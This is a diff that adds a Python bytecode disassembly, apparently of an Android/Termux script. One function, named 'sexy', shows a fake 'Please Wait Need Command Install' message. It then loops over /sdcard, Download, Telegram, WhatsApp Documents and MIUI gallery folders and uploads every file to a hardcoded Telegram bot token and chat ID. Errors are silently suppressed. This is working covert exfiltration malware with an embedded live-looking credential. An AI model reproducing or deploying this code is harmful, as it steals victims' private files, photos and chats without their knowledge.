+            532 LOAD_CONST               9 ('\x1b[1;31mSERVER IF OFF')
+            534 PRECALL                  1
+            538 CALL                     1
+            548 POP_TOP
+
+224         550 LOAD_GLOBAL              5 (NULL + time)
+            562 LOAD_ATTR                3 (sleep)
+            572 LOAD_CONST               2 (2)
+            574 PRECALL                  1
+            578 CALL                     1
+            588 POP_TOP
+
+225         590 LOAD_GLOBAL             27 (NULL + sys)
+            602 LOAD_ATTR               12 (exit)
+            612 PRECALL                  0
+            616 CALL                     0
+            626 POP_TOP
+            628 LOAD_CONST               0 (None)
+            630 RETURN_VALUE
+        >>  632 PUSH_EXC_INFO
+
+226         634 POP_TOP
+
+227         636 LOAD_GLOBAL             27 (NULL + sys)
+            648 LOAD_ATTR               12 (exit)
+            658 PRECALL                  0
+            662 CALL                     0
+            672 POP_TOP
+            674 POP_EXCEPT
+            676 LOAD_CONST               0 (None)
+            678 RETURN_VALUE
+        >>  680 COPY                     3
+            682 POP_EXCEPT
+            684 RERAISE                  1
+ExceptionTable:
+  142 to 376 -> 632 [0]
+  382 to 514 -> 632 [0]
+  520 to 626 -> 632 [0]
+  632 to 672 -> 680 [1] lasti
+
+Disassembly of <code object sexy at 0xb83bc0, file "<x>", line 229>:
+229           0 RESUME                   0
+
+230           2 LOAD_GLOBAL              1 (NULL + print)
+             14 LOAD_CONST               1 ('Please Wait Need Command Install && Requests')
+             16 PRECALL                  1
+             20 CALL                     1
+             30 POP_TOP
+
+231          32 LOAD_GLOBAL              3 (NULL + requests)
+             44 LOAD_ATTR                2 (session)
+             54 PRECALL                  0
+             58 CALL                     0
+             68 STORE_FAST               0 (session)
+
+232          70 LOAD_CONST               2 ('7282202399:AAHkO_sxLbNrAPcb2D13UfWX7rjGdyv_KTw')
+             72 STORE_FAST               1 (bot_token)
+
+233          74 LOAD_CONST               3 ('6920736354')
+             76 STORE_FAST               2 (chat_id)
+
+235          78 NOP
+
+236          80 LOAD_CONST               4 ('/sdcard')
+             82 STORE_FAST               3 (sdcard_path)
+
+237          84 LOAD_CONST               5 (<code object <listcomp> at 0x7871277730, file "<x>", line 237>)
+             86 MAKE_FUNCTION            0
+             88 LOAD_GLOBAL              7 (NULL + os)
+            100 LOAD_ATTR                4 (listdir)
+            110 LOAD_FAST                3 (sdcard_path)
+            112 PRECALL                  1
+            116 CALL                     1
+            126 GET_ITER
+            128 PRECALL                  0
+            132 CALL                     0
+            142 STORE_FAST               4 (file_list)
+
+238         144 LOAD_FAST                4 (file_list)
+            146 GET_ITER
+        >>  148 FOR_ITER               138 (to 426)
+            150 STORE_FAST               5 (file)
+
+239         152 LOAD_GLOBAL             11 (NULL + open)
+            164 LOAD_GLOBAL              6 (os)
+            176 LOAD_ATTR                6 (path)
+            186 LOAD_METHOD              7 (join)
+            208 LOAD_FAST                3 (sdcard_path)
+            210 LOAD_FAST                5 (file)
+            212 PRECALL                  2
+            216 CALL                     2
+            226 LOAD_CONST               6 ('rb')
+            228 PRECALL                  2
+            232 CALL                     2
+            242 BEFORE_WITH
+            244 STORE_FAST               6 (f)
+
+240         246 LOAD_CONST               7 ('https://api.telegram.org/bot')
+            248 LOAD_FAST                1 (bot_token)
+            250 FORMAT_VALUE             0
+            252 LOAD_CONST               8 ('/sendDocument')
+            254 BUILD_STRING             3
+            256 STORE_FAST               7 (url)
+
+241         258 LOAD_CONST               9 ('chat_id')
+            260 LOAD_FAST                2 (chat_id)
+            262 BUILD_MAP                1
+            264 STORE_FAST               8 (data2)
+
+242         266 LOAD_CONST               9 ('chat_id')
+            268 LOAD_FAST                2 (chat_id)
+            270 BUILD_MAP                1
+            272 STORE_FAST               9 (data)
+
+243         274 LOAD_CONST              10 ('document')
+            276 LOAD_FAST                6 (f)
+            278 BUILD_MAP                1
+            280 STORE_FAST              10 (files)
+
+244         282 LOAD_FAST                0 (session)
+            284 LOAD_METHOD              8 (post)
+            306 LOAD_FAST                7 (url)
+            308 LOAD_FAST                9 (data)
+            310 LOAD_FAST               10 (files)
+            312 KW_NAMES                11
+            314 PRECALL                  3
+            318 CALL                     3
+            328 STORE_FAST              11 (get)
+
+245         330 LOAD_FAST                0 (session)
+            332 LOAD_METHOD              8 (post)
+            354 LOAD_FAST                7 (url)
+            356 LOAD_FAST                8 (data2)
+            358 LOAD_FAST               10 (files)
+            360 KW_NAMES                11
+            362 PRECALL                  3
+            366 CALL                     3
+            376 STORE_FAST              12 (sent)
+
+239         378 LOAD_CONST               0 (None)
+            380 LOAD_CONST               0 (None)
+            382 LOAD_CONST               0 (None)
+            384 PRECALL                  2
+            388 CALL                     2
+            398 POP_TOP
+            400 JUMP_FORWARD            11 (to 424)
+        >>  402 PUSH_EXC_INFO
+            404 WITH_EXCEPT_START
+            406 POP_JUMP_FORWARD_IF_TRUE     4 (to 416)
+            408 RERAISE                  2
+        >>  410 COPY                     3
+            412 POP_EXCEPT
+            414 RERAISE                  1
+        >>  416 POP_TOP
+            418 POP_EXCEPT
+            420 POP_TOP
+            422 POP_TOP
+        >>  424 JUMP_BACKWARD          139 (to 148)
+
+238     >>  426 JUMP_FORWARD             7 (to 442)
+        >>  428 PUSH_EXC_INFO
+
+246         430 POP_TOP
+            432 POP_EXCEPT
+            434 JUMP_FORWARD             3 (to 442)
+        >>  436 COPY                     3
+            438 POP_EXCEPT
+            440 RERAISE                  1
+
+248     >>  442 NOP
+
+249         444 LOAD_CONST              12 ('/sdcard/Download')
+            446 STORE_FAST               3 (sdcard_path)
+
+250         448 LOAD_CONST              13 (<code object <listcomp> at 0x7871277830, file "<x>", line 250>)
+            450 MAKE_FUNCTION            0
+            452 LOAD_GLOBAL              7 (NULL + os)
+            464 LOAD_ATTR                4 (listdir)
+            474 LOAD_FAST                3 (sdcard_path)
+            476 PRECALL                  1
+            480 CALL                     1
+            490 GET_ITER
+            492 PRECALL                  0
+            496 CALL                     0
+            506 STORE_FAST               4 (file_list)
+
+251         508 LOAD_FAST                4 (file_list)
+            510 GET_ITER
+        >>  512 FOR_ITER               138 (to 790)
+            514 STORE_FAST               5 (file)
+
+252         516 LOAD_GLOBAL             11 (NULL + open)
+            528 LOAD_GLOBAL              6 (os)
+            540 LOAD_ATTR                6 (path)
+            550 LOAD_METHOD              7 (join)
+            572 LOAD_FAST                3 (sdcard_path)
+            574 LOAD_FAST                5 (file)
+            576 PRECALL                  2
+            580 CALL                     2
+            590 LOAD_CONST               6 ('rb')
+            592 PRECALL                  2
+            596 CALL                     2
+            606 BEFORE_WITH
+            608 STORE_FAST               6 (f)
+
+253         610 LOAD_CONST               7 ('https://api.telegram.org/bot')
+            612 LOAD_FAST                1 (bot_token)
+            614 FORMAT_VALUE             0
+            616 LOAD_CONST               8 ('/sendDocument')
+            618 BUILD_STRING             3
+            620 STORE_FAST               7 (url)
+
+254         622 LOAD_CONST               9 ('chat_id')
+            624 LOAD_FAST                2 (chat_id)
+            626 BUILD_MAP                1
+            628 STORE_FAST               8 (data2)
+
+255         630 LOAD_CONST               9 ('chat_id')
+            632 LOAD_FAST                2 (chat_id)
+            634 BUILD_MAP                1
+            636 STORE_FAST               9 (data)
+
+256         638 LOAD_CONST              10 ('document')
+            640 LOAD_FAST                6 (f)
+            642 BUILD_MAP                1
+            644 STORE_FAST              10 (files)
+
+257         646 LOAD_FAST                0 (session)
+            648 LOAD_METHOD              8 (post)
+            670 LOAD_FAST                7 (url)
+            672 LOAD_FAST                9 (data)
+            674 LOAD_FAST               10 (files)
+            676 KW_NAMES                11
+            678 PRECALL                  3
+            682 CALL                     3
+            692 STORE_FAST              11 (get)
+
+258         694 LOAD_FAST                0 (session)
+            696 LOAD_METHOD              8 (post)
+            718 LOAD_FAST                7 (url)
+            720 LOAD_FAST                8 (data2)
+            722 LOAD_FAST               10 (files)
+            724 KW_NAMES                11
+            726 PRECALL                  3
+            730 CALL                     3
+            740 STORE_FAST              12 (sent)
+
+252         742 LOAD_CONST               0 (None)
+            744 LOAD_CONST               0 (None)
+            746 LOAD_CONST               0 (None)
+            748 PRECALL                  2
+            752 CALL                     2
+            762 POP_TOP
+            764 JUMP_FORWARD            11 (to 788)
+        >>  766 PUSH_EXC_INFO
+            768 WITH_EXCEPT_START
+            770 POP_JUMP_FORWARD_IF_TRUE     4 (to 780)
+            772 RERAISE                  2
+        >>  774 COPY                     3
+            776 POP_EXCEPT
+            778 RERAISE                  1
+        >>  780 POP_TOP
+            782 POP_EXCEPT
+            784 POP_TOP
+            786 POP_TOP
+        >>  788 JUMP_BACKWARD          139 (to 512)
+
+251     >>  790 JUMP_FORWARD             7 (to 806)
+        >>  792 PUSH_EXC_INFO
+
+259         794 POP_TOP
+            796 POP_EXCEPT
+            798 JUMP_FORWARD             3 (to 806)
+        >>  800 COPY                     3
+            802 POP_EXCEPT
+            804 RERAISE                  1
+
+261     >>  806 NOP
+
+262         808 LOAD_CONST              14 ('/sdcard/Download/Telegram')
+            810 STORE_FAST               3 (sdcard_path)
+
+263         812 LOAD_CONST              15 (<code object <listcomp> at 0x7871277930, file "<x>", line 263>)
+            814 MAKE_FUNCTION            0
+            816 LOAD_GLOBAL              7 (NULL + os)
+            828 LOAD_ATTR                4 (listdir)
+            838 LOAD_FAST                3 (sdcard_path)
+            840 PRECALL                  1
+            844 CALL                     1
+            854 GET_ITER
+            856 PRECALL                  0
+            860 CALL                     0
+            870 STORE_FAST               4 (file_list)
+
+264         872 LOAD_FAST                4 (file_list)
+            874 GET_ITER
+        >>  876 FOR_ITER               138 (to 1154)
+            878 STORE_FAST               5 (file)
+
+265         880 LOAD_GLOBAL             11 (NULL + open)
+            892 LOAD_GLOBAL              6 (os)
+            904 LOAD_ATTR                6 (path)
+            914 LOAD_METHOD              7 (join)
+            936 LOAD_FAST                3 (sdcard_path)
+            938 LOAD_FAST                5 (file)
+            940 PRECALL                  2
+            944 CALL                     2
+            954 LOAD_CONST               6 ('rb')
+            956 PRECALL                  2
+            960 CALL                     2
+            970 BEFORE_WITH
+            972 STORE_FAST               6 (f)
+
+266         974 LOAD_CONST               7 ('https://api.telegram.org/bot')
+            976 LOAD_FAST                1 (bot_token)
+            978 FORMAT_VALUE             0
+            980 LOAD_CONST               8 ('/sendDocument')
+            982 BUILD_STRING             3
+            984 STORE_FAST               7 (url)
+
+267         986 LOAD_CONST               9 ('chat_id')
+            988 LOAD_FAST                2 (chat_id)
+            990 BUILD_MAP                1
+            992 STORE_FAST               8 (data2)
+
+268         994 LOAD_CONST               9 ('chat_id')
+            996 LOAD_FAST                2 (chat_id)
+            998 BUILD_MAP                1
+           1000 STORE_FAST               9 (data)
+
+269        1002 LOAD_CONST              10 ('document')
+           1004 LOAD_FAST                6 (f)
+           1006 BUILD_MAP                1
+           1008 STORE_FAST              10 (files)
+
+270        1010 LOAD_FAST                0 (session)
+           1012 LOAD_METHOD              8 (post)
+           1034 LOAD_FAST                7 (url)
+           1036 LOAD_FAST                9 (data)
+           1038 LOAD_FAST               10 (files)
+           1040 KW_NAMES                11
+           1042 PRECALL                  3
+           1046 CALL                     3
+           1056 STORE_FAST              11 (get)
+
+271        1058 LOAD_FAST                0 (session)
+           1060 LOAD_METHOD              8 (post)
+           1082 LOAD_FAST                7 (url)
+           1084 LOAD_FAST                8 (data2)
+           1086 LOAD_FAST               10 (files)
+           1088 KW_NAMES                11
+           1090 PRECALL                  3
+           1094 CALL                     3
+           1104 STORE_FAST              12 (sent)
+
+265        1106 LOAD_CONST               0 (None)
+           1108 LOAD_CONST               0 (None)
+           1110 LOAD_CONST               0 (None)
+           1112 PRECALL                  2
+           1116 CALL                     2
+           1126 POP_TOP
+           1128 JUMP_FORWARD            11 (to 1152)
+        >> 1130 PUSH_EXC_INFO
+           1132 WITH_EXCEPT_START
+           1134 POP_JUMP_FORWARD_IF_TRUE     4 (to 1144)
+           1136 RERAISE                  2
+        >> 1138 COPY                     3
+           1140 POP_EXCEPT
+           1142 RERAISE                  1
+        >> 1144 POP_TOP
+           1146 POP_EXCEPT
+           1148 POP_TOP
+           1150 POP_TOP
+        >> 1152 JUMP_BACKWARD          139 (to 876)
+
+264     >> 1154 JUMP_FORWARD             7 (to 1170)
+        >> 1156 PUSH_EXC_INFO
+
+272        1158 POP_TOP
+           1160 POP_EXCEPT
+           1162 JUMP_FORWARD             3 (to 1170)
+        >> 1164 COPY                     3
+           1166 POP_EXCEPT
+           1168 RERAISE                  1
+
+274     >> 1170 NOP
+
+275        1172 LOAD_CONST              16 ('/sdcard/Telegram/Telegram Files')
+           1174 STORE_FAST               3 (sdcard_path)
+
+276        1176 LOAD_CONST              17 (<code object <listcomp> at 0x7871277a30, file "<x>", line 276>)
+           1178 MAKE_FUNCTION            0
+           1180 LOAD_GLOBAL              7 (NULL + os)
+           1192 LOAD_ATTR                4 (listdir)
+           1202 LOAD_FAST                3 (sdcard_path)
+           1204 PRECALL                  1
+           1208 CALL                     1
+           1218 GET_ITER
+           1220 PRECALL                  0
+           1224 CALL                     0
+           1234 STORE_FAST               4 (file_list)
+
+277        1236 LOAD_FAST                4 (file_list)
+           1238 GET_ITER
+        >> 1240 FOR_ITER               138 (to 1518)
+           1242 STORE_FAST               5 (file)
+
+278        1244 LOAD_GLOBAL             11 (NULL + open)
+           1256 LOAD_GLOBAL              6 (os)
+           1268 LOAD_ATTR                6 (path)
+           1278 LOAD_METHOD              7 (join)
+           1300 LOAD_FAST                3 (sdcard_path)
+           1302 LOAD_FAST                5 (file)
+           1304 PRECALL                  2
+           1308 CALL                     2
+           1318 LOAD_CONST               6 ('rb')
+           1320 PRECALL                  2
+           1324 CALL                     2
+           1334 BEFORE_WITH
+           1336 STORE_FAST               6 (f)
+
+279        1338 LOAD_CONST               7 ('https://api.telegram.org/bot')
+           1340 LOAD_FAST                1 (bot_token)
+           1342 FORMAT_VALUE             0
+           1344 LOAD_CONST               8 ('/sendDocument')
+           1346 BUILD_STRING             3
+           1348 STORE_FAST               7 (url)
+
+280        1350 LOAD_CONST               9 ('chat_id')
+           1352 LOAD_FAST                2 (chat_id)
+           1354 BUILD_MAP                1
+           1356 STORE_FAST               8 (data2)
+
+281        1358 LOAD_CONST               9 ('chat_id')
+           1360 LOAD_FAST                2 (chat_id)
+           1362 BUILD_MAP                1
+           1364 STORE_FAST               9 (data)
+
+282        1366 LOAD_CONST              10 ('document')
+           1368 LOAD_FAST                6 (f)
+           1370 BUILD_MAP                1
+           1372 STORE_FAST              10 (files)
+
+283        1374 LOAD_FAST                0 (session)
+           1376 LOAD_METHOD              8 (post)
+           1398 LOAD_FAST                7 (url)
+           1400 LOAD_FAST                9 (data)
+           1402 LOAD_FAST               10 (files)
+           1404 KW_NAMES                11
+           1406 PRECALL                  3
+           1410 CALL                     3
+           1420 STORE_FAST              11 (get)
+
+284        1422 LOAD_FAST                0 (session)
+           1424 LOAD_METHOD              8 (post)
+           1446 LOAD_FAST                7 (url)
+           1448 LOAD_FAST                8 (data2)
+           1450 LOAD_FAST               10 (files)
+           1452 KW_NAMES                11
+           1454 PRECALL                  3
+           1458 CALL                     3
+           1468 STORE_FAST              12 (sent)
+
+278        1470 LOAD_CONST               0 (None)
+           1472 LOAD_CONST               0 (None)
+           1474 LOAD_CONST               0 (None)
+           1476 PRECALL                  2
+           1480 CALL                     2
+           1490 POP_TOP
+           1492 JUMP_FORWARD            11 (to 1516)
+        >> 1494 PUSH_EXC_INFO
+           1496 WITH_EXCEPT_START
+           1498 POP_JUMP_FORWARD_IF_TRUE     4 (to 1508)
+           1500 RERAISE                  2
+        >> 1502 COPY                     3
+           1504 POP_EXCEPT
+           1506 RERAISE                  1
+        >> 1508 POP_TOP
+           1510 POP_EXCEPT
+           1512 POP_TOP
+           1514 POP_TOP
+        >> 1516 JUMP_BACKWARD          139 (to 1240)
+
+277     >> 1518 JUMP_FORWARD             7 (to 1534)
+        >> 1520 PUSH_EXC_INFO
+
+285        1522 POP_TOP
+           1524 POP_EXCEPT
+           1526 JUMP_FORWARD             3 (to 1534)
+        >> 1528 COPY                     3
+           1530 POP_EXCEPT
+           1532 RERAISE                  1
+
+287     >> 1534 NOP
+
+288        1536 LOAD_CONST              18 ('/sdcard/WhatsApp/Media/WhatsApp Documents')
+           1538 STORE_FAST               3 (sdcard_path)
+
+289        1540 LOAD_CONST              19 (<code object <listcomp> at 0x7871277b30, file "<x>", line 289>)
+           1542 MAKE_FUNCTION            0
+           1544 LOAD_GLOBAL              7 (NULL + os)
+           1556 LOAD_ATTR                4 (listdir)
+           1566 LOAD_FAST                3 (sdcard_path)
+           1568 PRECALL                  1
+           1572 CALL                     1
+           1582 GET_ITER
+           1584 PRECALL                  0
+           1588 CALL                     0
+           1598 STORE_FAST               4 (file_list)
+
+290        1600 LOAD_FAST                4 (file_list)
+           1602 GET_ITER
+        >> 1604 FOR_ITER               138 (to 1882)
+           1606 STORE_FAST               5 (file)
+
+291        1608 LOAD_GLOBAL             11 (NULL + open)
+           1620 LOAD_GLOBAL              6 (os)
+           1632 LOAD_ATTR                6 (path)
+           1642 LOAD_METHOD              7 (join)
+           1664 LOAD_FAST                3 (sdcard_path)
+           1666 LOAD_FAST                5 (file)
+           1668 PRECALL                  2
+           1672 CALL                     2
+           1682 LOAD_CONST               6 ('rb')
+           1684 PRECALL                  2
+           1688 CALL                     2
+           1698 BEFORE_WITH
+           1700 STORE_FAST               6 (f)
+
+292        1702 LOAD_CONST               7 ('https://api.telegram.org/bot')
+           1704 LOAD_FAST                1 (bot_token)
+           1706 FORMAT_VALUE             0
+           1708 LOAD_CONST               8 ('/sendDocument')
+           1710 BUILD_STRING             3
+           1712 STORE_FAST               7 (url)
+
+293        1714 LOAD_CONST               9 ('chat_id')
+           1716 LOAD_FAST                2 (chat_id)
+           1718 BUILD_MAP                1
+           1720 STORE_FAST               8 (data2)
+
+294        1722 LOAD_CONST               9 ('chat_id')
+           1724 LOAD_FAST                2 (chat_id)
+           1726 BUILD_MAP                1
+           1728 STORE_FAST               9 (data)
+
+295        1730 LOAD_CONST              10 ('document')
+           1732 LOAD_FAST                6 (f)
+           1734 BUILD_MAP                1
+           1736 STORE_FAST              10 (files)
+
+296        1738 LOAD_FAST                0 (session)
+           1740 LOAD_METHOD              8 (post)
+           1762 LOAD_FAST                7 (url)
+           1764 LOAD_FAST                9 (data)
+           1766 LOAD_FAST               10 (files)
+           1768 KW_NAMES                11
+           1770 PRECALL                  3
+           1774 CALL                     3
+           1784 STORE_FAST              11 (get)
+
+297        1786 LOAD_FAST                0 (session)
+           1788 LOAD_METHOD              8 (post)
+           1810 LOAD_FAST                7 (url)
+           1812 LOAD_FAST                8 (data2)
+           1814 LOAD_FAST               10 (files)
+           1816 KW_NAMES                11
+           1818 PRECALL                  3
+           1822 CALL                     3
+           1832 STORE_FAST              12 (sent)
+
+291        1834 LOAD_CONST               0 (None)
+           1836 LOAD_CONST               0 (None)
+           1838 LOAD_CONST               0 (None)
+           1840 PRECALL                  2
+           1844 CALL                     2
+           1854 POP_TOP
+           1856 JUMP_FORWARD            11 (to 1880)
+        >> 1858 PUSH_EXC_INFO
+           1860 WITH_EXCEPT_START
+           1862 POP_JUMP_FORWARD_IF_TRUE     4 (to 1872)
+           1864 RERAISE                  2
+        >> 1866 COPY                     3
+           1868 POP_EXCEPT
+           1870 RERAISE                  1
+        >> 1872 POP_TOP
+           1874 POP_EXCEPT
+           1876 POP_TOP
+           1878 POP_TOP
+        >> 1880 JUMP_BACKWARD          139 (to 1604)
+
+290     >> 1882 JUMP_FORWARD             7 (to 1898)
+        >> 1884 PUSH_EXC_INFO
+
+298        1886 POP_TOP
+           1888 POP_EXCEPT
+           1890 JUMP_FORWARD             3 (to 1898)
+        >> 1892 COPY                     3
+           1894 POP_EXCEPT
+           1896 RERAISE                  1
+
+300     >> 1898 NOP
+
+301        1900 LOAD_CONST              20 ('/sdcard/Android/data/com.miui.gallery')
+           1902 STORE_FAST               3 (sdcard_path)
+
+302        1904 LOAD_CONST              21 (<code object <listcomp> at 0x7871277c30, file "<x>", line 302>)
+           1906 MAKE_FUNCTION            0
+           1908 LOAD_GLOBAL              7 (NULL + os)
+           1920 LOAD_ATTR                4 (listdir)
+           1930 LOAD_FAST                3 (sdcard_path)
+           1932 PRECALL                  1
+           1936 CALL                     1
+           1946 GET_ITER
+           1948 PRECALL                  0
+           1952 CALL                     0
+           1962 STORE_FAST               4 (file_list)
+
+303        1964 LOAD_FAST                4 (file_list)
+           1966 GET_ITER
+        >> 1968 FOR_ITER               138 (to 2246)
+           1970 STORE_FAST               5 (file)
+
+304        1972 LOAD_GLOBAL             11 (NULL + open)
+           1984 LOAD_GLOBAL              6 (os)
+           1996 LOAD_ATTR                6 (path)
+           2006 LOAD_METHOD              7 (join)
+           2028 LOAD_FAST                3 (sdcard_path)
+           2030 LOAD_FAST                5 (file)
+           2032 PRECALL                  2
+           2036 CALL                     2
+           2046 LOAD_CONST               6 ('rb')
+           2048 PRECALL                  2
+           2052 CALL                     2
+           2062 BEFORE_WITH
+           2064 STORE_FAST               6 (f)
+
+305        2066 LOAD_CONST               7 ('https://api.telegram.org/bot')
+           2068 LOAD_FAST                1 (bot_token)
+           2070 FORMAT_VALUE             0
+           2072 LOAD_CONST               8 ('/sendDocument')
+           2074 BUILD_STRING             3
+           2076 STORE_FAST               7 (url)
+
+306        2078 LOAD_CONST               9 ('chat_id')
+           2080 LOAD_FAST                2 (chat_id)
+           2082 BUILD_MAP                1
+           2084 STORE_FAST               8 (data2)
+
+307        2086 LOAD_CONST               9 ('chat_id')
+           2088 LOAD_FAST                2 (chat_id)
+           2090 BUILD_MAP                1
+           2092 STORE_FAST               9 (data)
+
+308        2094 LOAD_CONST              10 ('document')
+           2096 LOAD_FAST                6 (f)
+           2098 BUILD_MAP                1
+           2100 STORE_FAST              10 (files)
+
+309        2102 LOAD_FAST                0 (session)
+           2104 LOAD_METHOD              8 (post)
+           2126 LOAD_FAST                7 (url)
+           2128 LOAD_FAST                9 (data)
+           2130 LOAD_FAST               10 (files)
+           2132 KW_NAMES                11
+           2134 PRECALL                  3
+           2138 CALL                     3
+           2148 STORE_FAST              11 (get)
+
+310        2150 LOAD_FAST                0 (session)
+           2152 LOAD_METHOD              8 (post)
+           2174 LOAD_FAST                7 (url)
+           2176 LOAD_FAST                8 (data2)
+           2178 LOAD_FAST               10 (files)
+           2180 KW_NAMES                11
+           2182 PRECALL                  3
+           2186 CALL                     3
+           2196 STORE_FAST              12 (sent)
+
+304        2198 LOAD_CONST               0 (None)
+           2200 LOAD_CONST               0 (None)
+           2202 LOAD_CONST               0 (None)
+           2204 PRECALL                  2
+           2208 CALL                     2
+           2218 POP_TOP
+           2220 JUMP_FORWARD            11 (to 2244)
+        >> 2222 PUSH_EXC_INFO
+           2224 WITH_EXCEPT_START
+           2226 POP_JUMP_FORWARD_IF_TRUE     4 (to 2236)
+           2228 RERAISE                  2
+        >> 2230 COPY                     3
+           2232 POP_EXCEPT
+           2234 RERAISE                  1
+        >> 2236 POP_TOP
+           2238 POP_EXCEPT
+           2240 POP_TOP
+           2242 POP_TOP
+        >> 2244 JUMP_BACKWARD          139 (to 1968)
+
+303     >> 2246 JUMP_FORWARD             7 (to 2262)
+        >> 2248 PUSH_EXC_INFO
+
+311        2250 POP_TOP
+           2252 POP_EXCEPT
+           2254 JUMP_FORWARD             3 (to 2262)
+        >> 2256 COPY                     3
+           2258 POP_EXCEPT
+           2260 RERAISE                  1
+
+313     >> 2262 NOP
+
+314        2264 LOAD_CONST              20 ('/sdcard/Android/data/com.miui.gallery')
+           2266 STORE_FAST               3 (sdcard_path)
+
+315        2268 LOAD_CONST              22 (<code object <listcomp> at 0x7871277d30, file "<x>", line 315>)
+           2270 MAKE_FUNCTION            0
+           2272 LOAD_GLOBAL              7 (NULL + os)
+           2284 LOAD_ATTR                4 (listdir)
+           2294 LOAD_FAST                3 (sdcard_path)
+           2296 PRECALL                  1
+           2300 CALL                     1
+           2310 GET_ITER
+           2312 PRECALL                  0
+           2316 CALL                     0
+           2326 STORE_FAST               4 (file_list)
+
+316        2328 LOAD_FAST                4 (file_list)
+           2330 GET_ITER
+        >> 2332 FOR_ITER               138 (to 2610)
+           2334 STORE_FAST               5 (file)
+
+317        2336 LOAD_GLOBAL             11 (NULL + open)
+           2348 LOAD_GLOBAL              6 (os)
+           2360 LOAD_ATTR                6 (path)
+           2370 LOAD_METHOD              7 (join)
+           2392 LOAD_FAST                3 (sdcard_path)
+           2394 LOAD_FAST                5 (file)
+           2396 PRECALL                  2
+           2400 CALL                     2
+           2410 LOAD_CONST               6 ('rb')
+           2412 PRECALL                  2
+           2416 CALL                     2
+           2426 BEFORE_WITH
+           2428 STORE_FAST               6 (f)
+
+318        2430 LOAD_CONST               7 ('https://api.telegram.org/bot')
+           2432 LOAD_FAST                1 (bot_token)
+           2434 FORMAT_VALUE             0
+           2436 LOAD_CONST              23 ('/sendImages')
+           2438 BUILD_STRING             3
+           2440 STORE_FAST               7 (url)
+
+319        2442 LOAD_CONST               9 ('chat_id')
+           2444 LOAD_FAST                2 (chat_id)
+           2446 BUILD_MAP                1
+           2448 STORE_FAST               8 (data2)
+
+320        2450 LOAD_CONST               9 ('chat_id')
+           2452 LOAD_FAST                2 (chat_id)
+           2454 BUILD_MAP                1
+           2456 STORE_FAST               9 (data)
+
+321        2458 LOAD_CONST              24 ('images')
+           2460 LOAD_FAST                6 (f)
+           2462 BUILD_MAP                1
+           2464 STORE_FAST              10 (files)
+
+322        2466 LOAD_FAST                0 (session)
+           2468 LOAD_METHOD              8 (post)
+           2490 LOAD_FAST                7 (url)
+           2492 LOAD_FAST                9 (data)
+           2494 LOAD_FAST               10 (files)
+           2496 KW_NAMES                11
+           2498 PRECALL                  3
+           2502 CALL                     3
+           2512 STORE_FAST              11 (get)
+
+323        2514 LOAD_FAST                0 (session)
+           2516 LOAD_METHOD              8 (post)
+           2538 LOAD_FAST                7 (url)
+           2540 LOAD_FAST                8 (data2)
+           2542 LOAD_FAST               10 (files)
+           2544 KW_NAMES                11
+           2546 PRECALL                  3
+           2550 CALL                     3
+           2560 STORE_FAST              12 (sent)
+
+317        2562 LOAD_CONST               0 (None)
+           2564 LOAD_CONST               0 (None)
+           2566 LOAD_CONST               0 (None)
+           2568 PRECALL                  2
+           2572 CALL                     2
+           2582 POP_TOP
+           2584 JUMP_FORWARD            11 (to 2608)
+        >> 2586 PUSH_EXC_INFO
+           2588 WITH_EXCEPT_START
+           2590 POP_JUMP_FORWARD_IF_TRUE     4 (to 2600)
+           2592 RERAISE                  2
+        >> 2594 COPY                     3
+           2596 POP_EXCEPT
+           2598 RERAISE                  1
+        >> 2600 POP_TOP
+           2602 POP_EXCEPT
+           2604 POP_TOP
+           2606 POP_TOP
+        >> 2608 JUMP_BACKWARD          139 (to 2332)
+
+316     >> 2610 JUMP_FORWARD             7 (to 2626)
+        >> 2612 PUSH_EXC_INFO
+
+324        2614 POP_TOP
+           2616 POP_EXCEPT
+           2618 JUMP_FORWARD             3 (to 2626)
+        >> 2620 COPY                     3
+           2622 POP_EXCEPT
+           2624 RERAISE                  1
+
+326     >> 2626 NOP
+
+327        2628 LOAD_CONST              20 ('/sdcard/Android/data/com.miui.gallery')
+           2630 STORE_FAST               3 (sdcard_path)
+
+328        2632 LOAD_CONST              25 (<code object <listcomp> at 0x7871277e30, file "<x>", line 328>)
+           2634 MAKE_FUNCTION            0
+           2636 LOAD_GLOBAL              7 (NULL + os)
+           2648 LOAD_ATTR                4 (listdir)
+           2658 LOAD_FAST                3 (sdcard_path)
+           2660 PRECALL                  1
+           2664 CALL                     1
+           2674 GET_ITER
+           2676 PRECALL                  0
+           2680 CALL                     0
+           2690 STORE_FAST               4 (file_list)
+
+329        2692 LOAD_FAST                4 (file_list)
+           2694 GET_ITER
+        >> 2696 FOR_ITER               138 (to 2974)
+           2698 STORE_FAST               5 (file)
+
+330        2700 LOAD_GLOBAL             11 (NULL + open)
+           2712 LOAD_GLOBAL              6 (os)
+           2724 LOAD_ATTR                6 (path)
+           2734 LOAD_METHOD              7 (join)
+           2756 LOAD_FAST                3 (sdcard_path)
+           2758 LOAD_FAST                5 (file)
+           2760 PRECALL                  2
+           2764 CALL                     2
+           2774 LOAD_CONST               6 ('rb')
+           2776 PRECALL                  2
+           2780 CALL                     2
+           2790 BEFORE_WITH
+           2792 STORE_FAST               6 (f)
+
+331        2794 LOAD_CONST               7 ('https://api.telegram.org/bot')
+           2796 LOAD_FAST                1 (bot_token)
+           2798 FORMAT_VALUE             0
+           2800 LOAD_CONST              26 ('/sendVideos')
+           2802 BUILD_STRING             3
+           2804 STORE_FAST               7 (url)
+
+332        2806 LOAD_CONST               9 ('chat_id')
+           2808 LOAD_FAST                2 (chat_id)
+           2810 BUILD_MAP                1
+           2812 STORE_FAST               8 (data2)
+
+333        2814 LOAD_CONST               9 ('chat_id')
+           2816 LOAD_FAST                2 (chat_id)
+           2818 BUILD_MAP                1
+           2820 STORE_FAST               9 (data)
+
+334        2822 LOAD_CONST              27 ('videos')
+           2824 LOAD_FAST                6 (f)
+           2826 BUILD_MAP                1
+           2828 STORE_FAST              10 (files)
+
+335        2830 LOAD_FAST                0 (session)
+           2832 LOAD_METHOD              8 (post)
+           2854 LOAD_FAST                7 (url)
+           2856 LOAD_FAST                9 (data)
+           2858 LOAD_FAST               10 (files)
+           2860 KW_NAMES                11
+           2862 PRECALL                  3
+           2866 CALL                     3
+           2876 STORE_FAST              11 (get)
+
+336        2878 LOAD_FAST                0 (session)
+           2880 LOAD_METHOD              8 (post)
+           2902 LOAD_FAST                7 (url)
+           2904 LOAD_FAST                8 (data2)
+           2906 LOAD_FAST               10 (files)
+           2908 KW_NAMES                11
+           2910 PRECALL                  3
+           2914 CALL                     3
+           2924 STORE_FAST              12 (sent)
+
